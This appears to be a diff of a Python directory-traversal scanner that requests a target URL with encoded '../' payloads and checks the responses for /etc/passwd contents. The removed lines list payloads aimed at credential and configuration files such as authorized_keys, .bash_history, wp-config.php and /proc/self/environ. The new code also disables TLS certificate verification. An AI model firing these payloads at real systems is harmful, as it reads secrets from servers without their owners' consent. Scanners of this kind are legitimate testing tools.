@@ -11,43 +11,23 @@ def check_directory_traversal(url):
         "%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd",
         "..%2F..%2F..%2F..%2F",
         "..%2F..%2F..%2F..%2F..%2F",
-        "../../../../../../../../var/log/messages",
-        "../../../../../../../../var/log/syslog",
-        "../../../../../../../../proc/self/environ",
-        "../../../../../../../../proc/self/status",
-        "../../../../../../../../var/www/html/index.php",
-        "../../../../../../../../var/www/html/config.php",
-        "../../../../../../../../var/tmp/",
-        "../../../../../../../../home/user/.ssh/authorized_keys",
-        "../../../../../../../../home/user/.bash_history",
-        "../../../../../../../../../var/log/apache2/access.log",
-        "../../../../../../../../../var/log/apache2/error.log",
-        "../../../../../../../../../var/backups",
-        "../../../../../../../../../var/www/html/admin/config.php",
-        "../../../../../../../../../var/www/html/wp-config.php",
-        "../../../../../../../../../etc/mysql/my.cnf",
-        "../../../../../../../../../etc/httpd/conf/httpd.conf",
-        "../../../../../../../../../usr/local/etc/php.ini",
-        "../../../../../../../../../usr/share/wordlists/rockyou.txt",
-        "../../../../../../../../../usr/share/dict/words",
-        "..%2F..%2F..%2F..%2Fweb%2F",
-        "..%2F..%2F..%2F..%2F%2E%2E%2Fweb%2F",
-        "..%2F..%2F..%2F..%2F%2E%2E%2Fweb%2Fadmin%2F",
-        "..%2F..%2F..%2F..%2F%2E%2E%2Fweb%2Fprivate%2F",
-        "..%2F..%2F..%2F..%2F%2E%2E%2Fweb%2Fuploads%2F",
-        "%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fweb%2F",
-        "..%252F..%252F..%252F..%252Fetc%252Fpasswd",
-        "..%252F..%252F..%252F..%252Fvar%252Flog%252Fsyslog",
-        "%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fusr%2Flocal%2Fbin%2F",
-        "..%252F..%252F..%252F..%252Fhome%252Fuser%252F.ssh%252Fauthorized_keys",
+    ]
+    
+    expected_strings = [
+        "root:x:0:0:root:/root:/bin/bash",  # Common content in /etc/passwd
+        "Daemon:2:2:Daemon:/sbin:/sbin/nologin"
     ]
     
     for payload in payloads:
         test_url = f"{url}?dir={payload}"
         try:
-            response = requests.get(test_url)
+            response = requests.get(test_url, verify=False)  # verify=False to ignore SSL certificate warnings
+            response_text = response.text
             if response.status_code == 200:
-                print(f"Vulnerable to Directory Traversal: {test_url}")
+                for expected_string in expected_strings:
+                    if expected_string in response_text:
+                        print(f"Vulnerable to Directory Traversal: {test_url}")
+                        break
             elif response.status_code == 403:
                 print(f"Forbidden: {test_url}")
             elif response.status_code == 401:
